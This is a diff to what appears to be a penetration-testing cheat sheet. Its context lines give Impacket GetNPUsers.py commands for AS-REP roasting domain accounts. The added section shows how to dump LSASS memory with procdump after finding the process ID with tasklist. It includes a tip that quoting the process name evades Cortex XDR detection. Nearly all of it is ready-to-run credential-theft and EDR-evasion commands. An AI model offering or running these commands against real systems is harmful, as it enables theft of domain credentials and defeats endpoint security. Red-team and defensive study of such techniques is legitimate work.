@@ -333,3 +333,18 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 # check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
+
+## Dumping LSASS Without Mimikatz:
+
+To get LSASS process ID via CMD:
+
+```
+PS C:\Users\test> tasklist | findstr lsass
+lsass.exe                      580 Services                   0     51,752 K
+```
+
+Depending on the EDR, it may be sufficient to simply add quotations around the process name (This bypasses Cortex XDR for example):
+
+```
+procdump.exe -accepteula -ma “lsass.exe” out.dmp
+```
